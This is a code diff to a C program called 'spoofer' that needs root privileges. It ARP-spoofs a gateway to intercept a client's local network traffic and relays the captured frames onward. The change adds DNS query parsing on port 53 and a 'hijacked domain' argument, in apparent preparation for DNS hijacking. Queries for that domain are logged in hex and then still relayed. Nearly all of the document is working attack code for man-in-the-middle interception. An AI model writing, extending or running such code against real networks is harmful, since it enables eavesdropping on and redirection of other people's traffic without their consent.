@@ -1,8 +1,7 @@
 // This program requires root privilages.
-// Usage: ./spoofer INTERFACE GW_HW_ADDR GW_IP_ADDR CLIENT_IP_ADDR IP_MASK
+// Usage: ./spoofer INTERFACE GW_HW_ADDR GW_IP_ADDR CLIENT_IP_ADDR IP_MASK HIJACKED_DOMAIN
 
 #include <arpa/inet.h>
-//#include <linux/if_arp.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
 #include <netinet/in.h>
@@ -15,6 +14,8 @@
 #include <unistd.h>
 #include <pthread.h>
 #include <libnet.h>
+
+#include "dns_helpers.h"
 
 void * arp_spoofer(void * param)
 {
@@ -56,7 +57,7 @@ int main(int argc, char** argv) {
   pthread_t arp;
   int sfd, gwsfd, ifindex;
   int i;
-  ssize_t len, udplen;
+  ssize_t len;
   char* frame;
   char* fdata;
   struct ethhdr* fhead;
@@ -66,7 +67,7 @@ int main(int argc, char** argv) {
   char saddr[16], daddr[16], bcastaddr[16];
   unsigned char hwaddr[6];
   struct udphdr *udp;
-  unsigned char * udpdata;
+  char * udpdata;
   
   // get broadcast address
   inet_pton(AF_INET, argv[3], &(gway));
@@ -105,6 +106,9 @@ int main(int argc, char** argv) {
   sall.sll_halen = ETH_ALEN;
   bind(sfd, (struct sockaddr*) &sall, sizeof(struct sockaddr_ll));
 
+  // get hijacked domain struct
+  struct domain * hijacked = domain_struct_from_domain_name(argv[6]);
+
   // start the arp spoofer
   pthread_create(&arp, NULL, arp_spoofer, argv[3]);
 
@@ -128,35 +132,80 @@ int main(int argc, char** argv) {
 
     if (ip->protocol == IPPROTO_UDP)
     {
-      //udp = (struct udphdr*)ip + (ip->ihl * 4);
-      udpdata = (unsigned char *)ip + (ip->ihl * 4) + sizeof(struct udphdr);
-      udplen = len - (ETH_HLEN + (ip->ihl * 4) + sizeof(struct udphdr));
+      udp = (struct udphdr*)((char *)ip + (ip->ihl * 4));
+      udpdata = (char *)ip + (ip->ihl * 4) + sizeof(struct udphdr);
 
-      memcpy(fhead->h_source, hwaddr, ETH_ALEN);
+      if (ntohs(udp->dest) == 53)
+      {
+        unsigned short id, flags, qs, as;
+        char * query;
+        int dnslen = ntohs(udp->len) - 8;
 
-      sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-         &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
-         &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
+        id = (udpdata[0] << 8 | udpdata[1] << 0);
+        flags = (udpdata[2] << 8 | udpdata[3] << 0);
+        qs = (udpdata[4] << 8 | udpdata[5] << 0);
+        as = (udpdata[6] << 8 | udpdata[7] << 0);
 
-      len = sendto(gwsfd, frame, len, 0,
-            (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
+        query = udpdata + 12;
 
-      printf("relaying UDP from %s [%ldB]\n", saddr, len);
-      printf("UDP data: %s\n", udpdata);
-      for (i = 0; i < len ; i++) {
-        printf("%02x ", (unsigned char) frame[i]);
-        if ((i + 1) % 16 == 0)
-          printf("\n");
+        struct domain * d = domain_struct_from_dns_query(query);
+
+        // relay packet and continue if requested domain doesn't match the hijacked one
+        if (compare_domain_structs(d, hijacked) != 0)
+        {
+          memcpy(fhead->h_source, hwaddr, ETH_ALEN);
+
+          sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+            &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
+            &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
+
+          len = sendto(gwsfd, frame, len, 0,
+                (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
+
+          continue;
+        }
+
+        struct domain * head = d;
+        while (d != NULL)
+        {
+          printf("%s.", d->content);
+          d = d->next;
+        }
+        printf("\n\n\n");
+        delete_domain_struct(head);
+
+        printf("ID: %hu, questions: %hu\n", id, qs);
+
+        for (i = 0; i < dnslen ; i++) {
+          printf("%02x ", (char) udpdata[i]);
+          if ((i + 1) % 16 == 0)
+            printf("\n");
+        }
+        printf("\n\n");
+
+        memcpy(fhead->h_source, hwaddr, ETH_ALEN);
+
+        sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+          &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
+          &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
+
+        len = sendto(gwsfd, frame, len, 0,
+              (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
       }
-      printf("\n\n");
-      for (i = 0; i < udplen ; i++) {
-        printf("%02x ", (unsigned char) udpdata[i]);
-        if ((i + 1) % 16 == 0)
-          printf("\n");
+      // relay other UDP datagrams
+      else
+      {
+        memcpy(fhead->h_source, hwaddr, ETH_ALEN);
+
+        sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+          &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
+          &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
+
+        len = sendto(gwsfd, frame, len, 0,
+              (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
       }
-      printf("\n\n\n");
     }
-    // relay all other packets to gateway
+    // relay all other frames to gateway
     else
     {
       memcpy(fhead->h_source, hwaddr, ETH_ALEN);
